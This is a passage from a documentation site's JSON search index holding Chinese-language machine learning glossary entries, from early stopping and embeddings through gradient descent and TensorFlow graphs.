E"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#61-early-stopping","text":"\u4e00\u79cd \u6b63\u5219\u5316 \u65b9\u6cd5\uff0c\u662f\u6307\u5728\u8bad\u7ec3\u635f\u5931\u4ecd\u53ef\u4ee5\u7ee7\u7eed\u964d\u4f4e\u4e4b\u524d\u7ed3\u675f\u6a21\u578b\u8bad\u7ec3\u3002\u4f7f\u7528\u65e9\u505c\u6cd5\u65f6\uff0c\u60a8\u4f1a\u5728 \u9a8c\u8bc1\u6570\u636e\u96c6 \u7684\u635f\u5931\u5f00\u59cb\u589e\u5927\uff08\u4e5f\u5c31\u662f \u6cdb\u5316 \u6548\u679c\u53d8\u5dee\uff09\u65f6\u7ed3\u675f\u6a21\u578b\u8bad\u7ec3\u3002","title":"6.1. \u65e9\u505c\u6cd5 (early stopping)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#62-embeddings","text":"\u4e00\u79cd\u5206\u7c7b\u7279\u5f81\uff0c\u4ee5\u8fde\u7eed\u503c\u7279\u5f81\u8868\u793a\u3002\u901a\u5e38\uff0c\u5d4c\u5957\u662f\u6307\u5c06\u9ad8\u7ef4\u5ea6\u5411\u91cf\u6620\u5c04\u5230\u4f4e\u7ef4\u5ea6\u7684\u7a7a\u95f4\u3002\u4f8b\u5982\uff0c\u60a8\u53ef\u4ee5\u91c7\u7528\u4ee5\u4e0b\u4e24\u79cd\u65b9\u5f0f\u4e4b\u4e00\u6765\u8868\u793a\u82f1\u6587\u53e5\u5b50\u4e2d\u7684\u5355\u8bcd\uff1a \u8868\u793a\u6210\u5305\u542b\u767e\u4e07\u4e2a\u5143\u7d20\uff08\u9ad8\u7ef4\u5ea6\uff09\u7684 \u7a00\u758f\u5411\u91cf \uff0c\u5176\u4e2d\u6240\u6709\u5143\u7d20\u90fd\u662f\u6574\u6570\u3002\u5411\u91cf\u4e2d\u7684\u6bcf\u4e2a\u5355\u5143\u683c\u90fd\u8868\u793a\u4e00\u4e2a\u5355\u72ec\u7684\u82f1\u6587\u5355\u8bcd\uff0c\u5355\u5143\u683c\u4e2d\u7684\u503c\u8868\u793a\u76f8\u5e94\u5355\u8bcd\u5728\u53e5\u5b50\u4e2d\u51fa\u73b0\u7684\u6b21\u6570\u3002\u7531\u4e8e\u5355\u4e2a\u82f1\u6587\u53e5\u5b50\u5305\u542b\u7684\u5355\u8bcd\u4e0d\u592a\u53ef\u80fd\u8d85\u8fc7 50 \u4e2a\uff0c\u56e0\u6b64\u5411\u91cf\u4e2d\u51e0\u4e4e\u6bcf\u4e2a\u5355\u5143\u683c\u90fd\u5305\u542b 0\u3002\u5c11\u6570\u975e 0 \u7684\u5355\u5143\u683c\u4e2d\u5c06\u5305\u542b\u4e00\u4e2a\u975e\u5e38\u5c0f\u7684\u6574\u6570\uff08\u901a\u5e38\u4e3a 1\uff09\uff0c\u8be5\u6574\u6570\u8868\u793a\u76f8\u5e94\u5355\u8bcd\u5728\u53e5\u5b50\u4e2d\u51fa\u73b0\u7684\u6b21\u6570\u3002 \u8868\u793a\u6210\u5305\u542b\u6570\u767e\u4e2a\u5143\u7d20\uff08\u4f4e\u7ef4\u5ea6\uff09\u7684 \u5bc6\u96c6\u5411\u91cf \uff0c\u5176\u4e2d\u6bcf\u4e2a\u5143\u7d20\u90fd\u5b58\u50a8\u4e00\u4e2a\u4ecb\u4e8e 0 \u5230 1 \u4e4b\u95f4\u7684\u6d6e\u70b9\u503c\u3002\u8fd9\u5c31\u662f\u4e00\u79cd\u5d4c\u5957\u3002 \u5728 TensorFlow \u4e2d\uff0c\u4f1a\u6309 \u53cd\u5411\u4f20\u64ad \u635f\u5931 \u8bad\u7ec3\u5d4c\u5957\uff0c\u548c\u8bad\u7ec3 \u795e\u7ecf\u7f51\u7edc \u4e2d\u7684\u4efb\u4f55\u5176\u4ed6\u53c2\u6570\u4e00\u6837\u3002","title":"6.2. \u5d4c\u5957 (embeddings)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#63-erm-empirical-risk-minimization","text":"\u7528\u4e8e\u9009\u62e9\u53ef\u4ee5\u5c06\u57fa\u4e8e\u8bad\u7ec3\u96c6\u7684\u635f\u5931\u964d\u81f3\u6700\u4f4e\u7684\u51fd\u6570\u3002\u4e0e \u7ed3\u6784\u98ce\u9669\u6700\u5c0f\u5316 \u76f8\u5bf9\u3002","title":"6.3. \u7ecf\u9a8c\u98ce\u9669\u6700\u5c0f\u5316 (ERM, empirical risk minimization)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#64-ensemble","text":"\u591a\u4e2a \u6a21\u578b \u7684\u9884\u6d4b\u7ed3\u679c\u7684\u5e76\u96c6\u3002\u60a8\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u4e00\u9879\u6216\u591a\u9879\u6765\u521b\u5efa\u96c6\u6210\u5b66\u4e60\uff1a \u4e0d\u540c\u7684\u521d\u59cb\u5316 \u4e0d\u540c\u7684 \u8d85\u53c2\u6570 \u4e0d\u540c\u7684\u6574\u4f53\u7ed3\u6784 \u6df1\u5ea6\u6a21\u578b\u548c\u5bbd\u5ea6\u6a21\u578b \u5c5e\u4e8e\u4e00\u79cd\u96c6\u6210\u5b66\u4e60\u3002","title":"6.4. \u96c6\u6210\u5b66\u4e60 (ensemble)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#65-epoch","text":"\u5728\u8bad\u7ec3\u65f6\uff0c\u6574\u4e2a\u6570\u636e\u96c6\u7684\u4e00\u6b21\u5b8c\u6574\u904d\u5386\uff0c\u4ee5\u4fbf\u4e0d\u6f0f\u6389\u4efb\u4f55\u4e00\u4e2a\u6837\u672c\u3002\u56e0\u6b64\uff0c\u4e00\u4e2a\u5468\u671f\u8868\u793a\uff08 N / \u6279\u6b21\u5927\u5c0f \uff09\u6b21\u8bad\u7ec3 \u8fed\u4ee3 \uff0c\u5176\u4e2d N \u662f\u6837\u672c\u603b\u6570\u3002","title":"6.5. \u5468\u671f (epoch)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#66-estimator","text":"tf.Estimator \u7c7b\u7684\u4e00\u4e2a\u5b9e\u4f8b\uff0c\u7528\u4e8e\u5c01\u88c5\u8d1f\u8d23\u6784\u5efa TensorFlow \u56fe\u5e76\u8fd0\u884c TensorFlow \u4f1a\u8bdd\u7684\u903b\u8f91\u3002\u60a8\u53ef\u4ee5\u521b\u5efa \u81ea\u5b9a\u4e49 Estimator \uff08\u5982\u9700\u76f8\u5173\u4ecb\u7ecd\uff0c\u8bf7 \u70b9\u51fb\u6b64\u5904 \uff09\uff0c\u4e5f\u53ef\u4ee5\u5b9e\u4f8b\u5316\u5176\u4ed6\u4eba \u9884\u521b\u5efa\u7684 Estimator \u3002","title":"6.6. Estimator"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#67-example","text":"\u6570\u636e\u96c6\u7684\u4e00\u884c\u3002\u4e00\u4e2a\u6837\u672c\u5305\u542b\u4e00\u4e2a\u6216\u591a\u4e2a \u7279\u5f81 \uff0c\u6b64\u5916\u8fd8\u53ef\u80fd\u5305\u542b\u4e00\u4e2a \u6807\u7b7e \u3002\u53e6\u8bf7\u53c2\u9605 \u6709\u6807\u7b7e\u6837\u672c \u548c \u65e0\u6807\u7b7e\u6837\u672c \u3002","title":"6.7. \u6837\u672c (example)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#7-f","text":"","title":"7. F"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#71-fn-false-negative","text":"\u88ab\u6a21\u578b\u9519\u8bef\u5730\u9884\u6d4b\u4e3a \u8d1f\u7c7b\u522b \u7684\u6837\u672c\u3002\u4f8b\u5982\uff0c\u6a21\u578b\u63a8\u65ad\u51fa\u67d0\u5c01\u7535\u5b50\u90ae\u4ef6\u4e0d\u662f\u5783\u573e\u90ae\u4ef6\uff08\u8d1f\u7c7b\u522b\uff09\uff0c\u4f46\u8be5\u7535\u5b50\u90ae\u4ef6\u5176\u5b9e\u662f\u5783\u573e\u90ae\u4ef6\u3002","title":"7.1. \u5047\u8d1f\u4f8b (FN, false negative)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#72-fp-false-positive","text":"\u88ab\u6a21\u578b\u9519\u8bef\u5730\u9884\u6d4b\u4e3a \u6b63\u7c7b\u522b \u7684\u6837\u672c\u3002\u4f8b\u5982\uff0c\u6a21\u578b\u63a8\u65ad\u51fa\u67d0\u5c01\u7535\u5b50\u90ae\u4ef6\u662f\u5783\u573e\u90ae\u4ef6\uff08\u6b63\u7c7b\u522b\uff09\uff0c\u4f46\u8be5\u7535\u5b50\u90ae\u4ef6\u5176\u5b9e\u4e0d\u662f\u5783\u573e\u90ae\u4ef6\u3002","title":"7.2. \u5047\u6b63\u4f8b (FP, false positive)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#73-false-positive-rate-fp","text":"ROC \u66f2\u7ebf \u4e2d\u7684 x \u8f74\u3002FP \u7387\u7684\u5b9a\u4e49\u5982\u4e0b\uff1a \\text{\u5047\u6b63\u4f8b\u7387} = \\frac{\\text{\u5047\u6b63\u4f8b\u6570}}{\\text{\u5047\u6b63\u4f8b\u6570 + \u8d1f\u4f8b\u6570}}","title":"7.3. \u5047\u6b63\u4f8b\u7387\uff08false positive rate, \u7b80\u79f0 FP \u7387\uff09"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#74-feature","text":"\u5728\u8fdb\u884c \u9884\u6d4b \u65f6\u4f7f\u7528\u7684\u8f93\u5165\u53d8\u91cf\u3002","title":"7.4. \u7279\u5f81 (feature)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#75-tffeature_column","text":"\u6307\u5b9a\u6a21\u578b\u5e94\u8be5\u5982\u4f55\u89e3\u8bfb\u7279\u5b9a\u7279\u5f81\u7684\u4e00\u79cd\u51fd\u6570\u3002\u6b64\u7c7b\u51fd\u6570\u7684\u8f93\u51fa\u7ed3\u679c\u662f\u6240\u6709 Estimators \u6784\u9020\u51fd\u6570\u7684\u5fc5\u9700\u53c2\u6570\u3002 \u501f\u52a9 tf.feature_column \u51fd\u6570\uff0c\u6a21\u578b\u53ef\u5bf9\u8f93\u5165\u7279\u5f81\u7684\u4e0d\u540c\u8868\u793a\u6cd5\u8f7b\u677e\u8fdb\u884c\u5b9e\u9a8c\u3002\u6709\u5173\u8be6\u60c5\uff0c\u8bf7\u53c2\u9605\u300aTensorFlow \u7f16\u7a0b\u4eba\u5458\u6307\u5357\u300b\u4e2d\u7684 \u7279\u5f81\u5217 \u4e00\u7ae0\u3002 \"\u7279\u5f81\u5217\"\u662f Google \u4e13\u7528\u7684\u672f\u8bed\u3002\u7279\u5f81\u5217\u5728 Yahoo/Microsoft \u4f7f\u7528\u7684 VW \u7cfb\u7edf\u4e2d\u79f0\u4e3a\"\u547d\u540d\u7a7a\u95f4\"\uff0c\u4e5f\u79f0\u4e3a \u573a \u3002","title":"7.5. \u7279\u5f81\u5217 (tf.feature_column)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#76-feature-cross","text":"\u901a\u8fc7\u5c06\u5355\u72ec\u7684\u7279\u5f81\u8fdb\u884c\u7ec4\u5408\uff08\u6c42\u7b1b\u5361\u5c14\u79ef\uff09\u800c\u5f62\u6210\u7684 \u5408\u6210\u7279\u5f81 \u3002\u7279\u5f81\u7ec4\u5408\u6709\u52a9\u4e8e\u8868\u8fbe\u975e\u7ebf\u6027\u5173\u7cfb\u3002","title":"7.6. \u7279\u5f81\u7ec4\u5408 (feature cross)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#77-feature-engineering","text":"\u6307\u4ee5\u4e0b\u8fc7\u7a0b\uff1a\u786e\u5b9a\u54ea\u4e9b \u7279\u5f81 \u53ef\u80fd\u5728\u8bad\u7ec3\u6a21\u578b\u65b9\u9762\u975e\u5e38\u6709\u7528\uff0c\u7136\u540e\u5c06\u65e5\u5fd7\u6587\u4ef6\u53ca\u5176\u4ed6\u6765\u6e90\u7684\u539f\u59cb\u6570\u636e\u8f6c\u6362\u4e3a\u6240\u9700\u7684\u7279\u5f81\u3002\u5728 TensorFlow \u4e2d\uff0c\u7279\u5f81\u5de5\u7a0b\u901a\u5e38\u662f\u6307\u5c06\u539f\u59cb\u65e5\u5fd7\u6587\u4ef6\u6761\u76ee\u8f6c\u6362\u4e3a tf.Example \u534f\u8bae\u7f13\u51b2\u533a\u3002\u53e6\u8bf7\u53c2\u9605 tf.Transform \u3002 \u7279\u5f81\u5de5\u7a0b\u6709\u65f6\u79f0\u4e3a\u7279\u5f81\u63d0\u53d6\u3002","title":"7.7. \u7279\u5f81\u5de5\u7a0b (feature engineering)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#78-feature-set","text":"\u8bad\u7ec3\u673a\u5668\u5b66\u4e60\u6a21\u578b\u65f6\u91c7\u7528\u7684\u4e00\u7ec4 \u7279\u5f81 \u3002\u4f8b\u5982\uff0c\u5bf9\u4e8e\u67d0\u4e2a\u7528\u4e8e\u9884\u6d4b\u623f\u4ef7\u7684\u6a21\u578b\uff0c\u90ae\u653f\u7f16\u7801\u3001\u623f\u5c4b\u9762\u79ef\u4ee5\u53ca\u623f\u5c4b\u72b6\u51b5\u53ef\u4ee5\u7ec4\u6210\u4e00\u4e2a\u7b80\u5355\u7684\u7279\u5f81\u96c6\u3002","title":"7.8. \u7279\u5f81\u96c6 (feature set)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#79-feature-spec","text":"\u7528\u4e8e\u63cf\u8ff0\u5982\u4f55\u4ece tf.Example \u534f\u8bae\u7f13\u51b2\u533a\u63d0\u53d6 \u7279\u5f81 \u6570\u636e\u3002\u7531\u4e8e tf.Example \u534f\u8bae\u7f13\u51b2\u533a\u53ea\u662f\u4e00\u4e2a\u6570\u636e\u5bb9\u5668\uff0c\u56e0\u6b64\u60a8\u5fc5\u987b\u6307\u5b9a\u4ee5\u4e0b\u5185\u5bb9\uff1a \u8981\u63d0\u53d6\u7684\u6570\u636e\uff08\u5373\u7279\u5f81\u7684\u952e\uff09 \u6570\u636e\u7c7b\u578b\uff08\u4f8b\u5982 float \u6216 int\uff09 \u957f\u5ea6\uff08\u56fa\u5b9a\u6216\u53ef\u53d8\uff09 Estimator API \u63d0\u4f9b\u4e86\u4e00\u4e9b\u53ef\u7528\u6765\u6839\u636e\u7ed9\u5b9a FeatureColumns \u5217\u8868\u751f\u6210\u7279\u5f81\u89c4\u8303\u7684\u5de5\u5177\u3002","title":"7.9. \u7279\u5f81\u89c4\u8303 (feature spec)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#710-few-shot-learning","text":"\u4e00\u79cd\u673a\u5668\u5b66\u4e60\u65b9\u6cd5\uff08\u901a\u5e38\u7528\u4e8e\u5bf9\u8c61\u5206\u7c7b\uff09\uff0c\u65e8\u5728\u4ec5\u901a\u8fc7\u5c11\u91cf\u8bad\u7ec3\u6837\u672c\u5b66\u4e60\u6709\u6548\u7684\u5206\u7c7b\u5668\u3002 \u53e6\u8bf7\u53c2\u9605 \u5355\u6837\u672c\u5b66\u4e60 \u3002","title":"7.10. \u5c11\u91cf\u6837\u672c\u5b66\u4e60 (few-shot learning)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#711-softmax-full-softmax","text":"\u8bf7\u53c2\u9605 softmax \u3002\u4e0e \u5019\u9009\u91c7\u6837 \u76f8\u5bf9\u3002","title":"7.11. \u5b8c\u6574 softmax (full softmax)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#712-fully-connected-layer","text":"\u4e00\u79cd \u9690\u85cf\u5c42 \uff0c\u5176\u4e2d\u7684\u6bcf\u4e2a \u8282\u70b9 \u5747\u4e0e\u4e0b\u4e00\u4e2a\u9690\u85cf\u5c42\u4e2d\u7684\u6bcf\u4e2a\u8282\u70b9\u76f8\u8fde\u3002 \u5168\u8fde\u63a5\u5c42\u53c8\u79f0\u4e3a \u5bc6\u96c6\u5c42 \u3002","title":"7.12. \u5168\u8fde\u63a5\u5c42 (fully connected layer)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#8-g","text":"","title":"8. G"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#81-generalization","text":"\u6307\u7684\u662f\u6a21\u578b\u4f9d\u636e\u8bad\u7ec3\u65f6\u91c7\u7528\u7684\u6570\u636e\uff0c\u9488\u5bf9\u4ee5\u524d\u672a\u89c1\u8fc7\u7684\u65b0\u6570\u636e\u505a\u51fa\u6b63\u786e\u9884\u6d4b\u7684\u80fd\u529b\u3002","title":"8.1. \u6cdb\u5316 (generalization)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#82-generalized-linear-model","text":"\u6700\u5c0f\u4e8c\u4e58\u56de\u5f52 \u6a21\u578b\uff08\u57fa\u4e8e \u9ad8\u65af\u566a\u58f0 \uff09\u5411\u5176\u4ed6\u7c7b\u578b\u7684\u6a21\u578b\uff08\u57fa\u4e8e\u5176\u4ed6\u7c7b\u578b\u7684\u566a\u58f0\uff0c\u4f8b\u5982 \u6cca\u677e\u566a\u58f0 \u6216\u5206\u7c7b\u566a\u58f0\uff09\u8fdb\u884c\u7684\u4e00\u79cd\u6cdb\u5316\u3002\u5e7f\u4e49\u7ebf\u6027\u6a21\u578b\u7684\u793a\u4f8b\u5305\u62ec\uff1a \u903b\u8f91\u56de\u5f52 \u591a\u7c7b\u522b\u56de\u5f52 \u6700\u5c0f\u4e8c\u4e58\u56de\u5f52 \u53ef\u4ee5\u901a\u8fc7 \u51f8\u4f18\u5316 \u627e\u5230\u5e7f\u4e49\u7ebf\u6027\u6a21\u578b\u7684\u53c2\u6570\u3002 \u5e7f\u4e49\u7ebf\u6027\u6a21\u578b\u5177\u6709\u4ee5\u4e0b\u7279\u6027\uff1a \u6700\u4f18\u7684\u6700\u5c0f\u4e8c\u4e58\u56de\u5f52\u6a21\u578b\u7684\u5e73\u5747\u9884\u6d4b\u7ed3\u679c\u7b49\u4e8e\u8bad\u7ec3\u6570\u636e\u7684\u5e73\u5747\u6807\u7b7e\u3002 \u6700\u4f18\u7684\u903b\u8f91\u56de\u5f52\u6a21\u578b\u9884\u6d4b\u7684\u5e73\u5747\u6982\u7387\u7b49\u4e8e\u8bad\u7ec3\u6570\u636e\u7684\u5e73\u5747\u6807\u7b7e\u3002 \u5e7f\u4e49\u7ebf\u6027\u6a21\u578b\u7684\u529f\u80fd\u53d7\u5176\u7279\u5f81\u7684\u9650\u5236\u3002\u4e0e\u6df1\u5ea6\u6a21\u578b\u4e0d\u540c\uff0c\u5e7f\u4e49\u7ebf\u6027\u6a21\u578b\u65e0\u6cd5\"\u5b66\u4e60\u65b0\u7279\u5f81\"\u3002","title":"8.2. \u5e7f\u4e49\u7ebf\u6027\u6a21\u578b (generalized linear model)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#83-gradient","text":"\u504f\u5bfc\u6570 \u76f8\u5bf9\u4e8e\u6240\u6709\u81ea\u53d8\u91cf\u7684\u5411\u91cf\u3002\u5728\u673a\u5668\u5b66\u4e60\u4e2d\uff0c\u68af\u5ea6\u662f\u6a21\u578b\u51fd\u6570\u504f\u5bfc\u6570\u7684\u5411\u91cf\u3002\u68af\u5ea6\u6307\u5411\u6700\u9ad8\u901f\u4e0a\u5347\u7684\u65b9\u5411\u3002","title":"8.3. \u68af\u5ea6 (gradient)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#84-gradient-clipping","text":"\u5728\u5e94\u7528 \u68af\u5ea6 \u503c\u4e4b\u524d\u5148\u8bbe\u7f6e\u5176\u4e0a\u9650\u3002\u68af\u5ea6\u88c1\u526a\u6709\u52a9\u4e8e\u786e\u4fdd\u6570\u503c\u7a33\u5b9a\u6027\u4ee5\u53ca\u9632\u6b62 \u68af\u5ea6\u7206\u70b8 \u3002","title":"8.4. \u68af\u5ea6\u88c1\u526a (gradient clipping)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#85-gradient-descent","text":"\u4e00\u79cd\u901a\u8fc7\u8ba1\u7b97\u5e76\u4e14\u51cf\u5c0f\u68af\u5ea6\u5c06 \u635f\u5931 \u964d\u81f3\u6700\u4f4e\u7684\u6280\u672f\uff0c\u5b83\u4ee5\u8bad\u7ec3\u6570\u636e\u4e3a\u6761\u4ef6\uff0c\u6765\u8ba1\u7b97\u635f\u5931\u76f8\u5bf9\u4e8e\u6a21\u578b\u53c2\u6570\u7684\u68af\u5ea6\u3002\u901a\u4fd7\u6765\u8bf4\uff0c\u68af\u5ea6\u4e0b\u964d\u6cd5\u4ee5\u8fed\u4ee3\u65b9\u5f0f\u8c03\u6574\u53c2\u6570\uff0c\u9010\u6e10\u627e\u5230 \u6743\u91cd \u548c\u504f\u5dee\u7684\u6700\u4f73\u7ec4\u5408\uff0c\u4ece\u800c\u5c06\u635f\u5931\u964d\u81f3\u6700\u4f4e\u3002","title":"8.5. \u68af\u5ea6\u4e0b\u964d\u6cd5 (gradient descent)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#86-graph","text":"TensorFlow \u4e2d\u7684\u4e00\u79cd\u8ba1\u7b97\u89c4\u8303\u3002\u56fe\u4e2d\u7684\u8282\u70b9\u8868\u793a\u64cd\u4f5c\u3002\u8fb9\u7f18\u5177\u6709\u65b9\u5411\uff0c\u8868\u793a\u5c06\u67d0\u9879\u64cd\u4f5c\u7684\u7ed3\u679c\uff08\u4e00\u4e2a \u5f20\u91cf \uff09\u4f5c\u4e3a\u4e00\u4e2a\u64cd\u4f5c\u6570\u4f20\u9012\u7ed9\u53e6\u4e00\u9879\u64cd\u4f5c\u3002\u53ef\u4ee5\u4f7f\u7528 TensorBoard \u76f4\u89c2\u5448\u73b0\u56fe\u3002","title":"8.6. \u56fe 